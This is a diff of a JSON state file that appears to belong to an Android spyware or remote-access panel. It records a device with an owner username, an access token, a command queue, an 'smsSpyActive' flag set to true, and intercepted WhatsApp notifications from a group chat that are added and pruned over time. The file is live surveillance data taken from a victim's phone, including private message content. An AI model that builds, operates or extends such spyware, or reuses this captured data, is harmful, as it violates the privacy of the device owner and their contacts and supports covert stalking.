@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003739612,
+    "lastSeen": 1776003742252,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (15 pesan): ~ kv",
+        "content": "u",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003742300
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎15 pesan baru",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003742275
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (14 pesan): ~ kiwaa inii",
+        "content": "good night yah semuanya muahj",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003741578
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4099,30 +4123,6 @@
         "time": "12/04 09:56",
         "pkg": "com.whatsapp",
         "receivedAt": 1775962577918
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎4 pesan baru",
-        "time": "12/04 09:55",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775962532095
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎5 pesan dari 2 chat",
-        "time": "12/04 09:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775962149490
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎4 pesan dari 2 chat",
-        "time": "12/04 09:48",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775962126261
       }
     ],
     "galleryPhotos": [],
